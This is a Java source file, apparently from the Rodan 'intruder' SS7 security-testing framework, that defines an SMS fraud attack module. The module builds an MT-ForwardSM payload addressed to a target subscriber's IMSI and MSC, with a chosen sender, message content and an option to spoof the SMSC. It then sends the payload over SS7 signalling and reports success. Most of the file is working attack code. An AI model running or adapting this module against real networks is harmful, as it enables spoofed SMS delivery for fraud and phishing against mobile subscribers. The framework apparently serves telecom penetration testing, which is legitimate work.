/*
 * Etisalat Egypt, Open Source
 * Copyright 2021, Etisalat Egypt and individual contributors
 * by the @authors tag.
 *
 * This program is free software: you can redistribute it and/or modify
 * under the terms of the GNU Affero General Public License as
 * published by the Free Software Foundation; either version 3 of
 * the License, or (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU Affero General Public License for more details.
 *
 * You should have received a copy of the GNU Affero General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>
 */

/**
 * @author Ayman ElSherif
 */

package com.rodan.intruder.ss7.usecases.attacks.fraud;

import com.rodan.intruder.ss7.entities.event.model.sms.FsmResponse;
import com.rodan.intruder.ss7.entities.event.service.MapSmsServiceListener;
import com.rodan.intruder.ss7.entities.payload.sms.FsmPayload;
import com.rodan.intruder.ss7.usecases.Ss7ModuleTemplate;
import com.rodan.intruder.ss7.usecases.model.Ss7ModuleConstants;
import com.rodan.intruder.ss7.usecases.model.Ss7ModuleOptions;
import com.rodan.intruder.ss7.usecases.model.fraud.SmsFraudOptions;
import com.rodan.intruder.ss7.usecases.model.fraud.SmsFraudResponse;
import com.rodan.intruder.ss7.usecases.port.Ss7Gateway;
import com.rodan.library.model.Constants;
import com.rodan.library.model.annotation.Module;
import com.rodan.library.model.error.SystemException;
import com.rodan.intruder.kernel.usecases.SignalingModule;
import lombok.Builder;
import org.apache.log4j.LogManager;
import org.apache.log4j.Logger;

@Module(name = Ss7ModuleConstants.SMS_FRAUD_NAME, category = Ss7ModuleConstants.FRAUD_CATEGORY_DISPLAY_NAME,
        displayName = Ss7ModuleConstants.SMS_FRAUD_DISPLAY_NAME, brief = Ss7ModuleConstants.SMS_FRAUD_BRIEF,
        description = Ss7ModuleConstants.SMS_FRAUD_DESCRIPTION, rank = Ss7ModuleConstants.SMS_FRAUD_RANK,
        mainPayload = Constants.FSM_PAYLOAD_NAME)
public class SmsFraudModule extends Ss7ModuleTemplate implements SignalingModule, MapSmsServiceListener {
    final static Logger logger = LogManager.getLogger(SmsFraudModule.class);

    @Builder
    public SmsFraudModule(Ss7Gateway gateway, Ss7ModuleOptions moduleOptions) {
        super(gateway, moduleOptions);
    }

    @Override
    protected void generatePayload() {
        logger.debug("Generating payload");
        logger.debug("Module Options: " + moduleOptions);
        var options = (SmsFraudOptions) moduleOptions;
        var payload = FsmPayload.builder()
                .localGt(options.getNodeConfig().getSs7Association().getLocalNode().getGlobalTitle())
                .imsi(options.getImsi()).sender(options.getSender()).content(options.getContent())
                .messageType(options.getMessageType()).targetMscGt(options.getTargetMscGt())
                .smscGt(options.getSmscGt()).spoofSmsc(options.getSpoofSmsc())
                .mapVersion(options.getMapVersion())
                .build();
        setMainPayload(payload);
        setCurrentPayload(getMainPayload());
        logger.debug("Payload: " + payload);
    }

    @Override
    protected void addServiceListener() throws SystemException {
        logger.debug("Adding service listeners");
        super.addServiceListener();
        var localSsn = getMainPayload().getLocalSsn();
        getGateway().addSmsServiceListener(localSsn, this);
    }

    @Override
    protected void cleanup() throws SystemException {
        super.cleanup();
        if (getGateway() != null && getMainPayload() != null) {
            var localSsn = getMainPayload().getLocalSsn();
            getGateway().removeSmsServiceListener(localSsn, this);
        }
    }

    @Override
    public void onForwardShortMessageResponse(FsmResponse response) {
        logger.debug("##### Received MTForwardSM response!");
        logger.debug(response);
        moduleResponse = SmsFraudResponse.builder().result("SMS sent successfully").build();
        setResultReceived(true);
    }
}
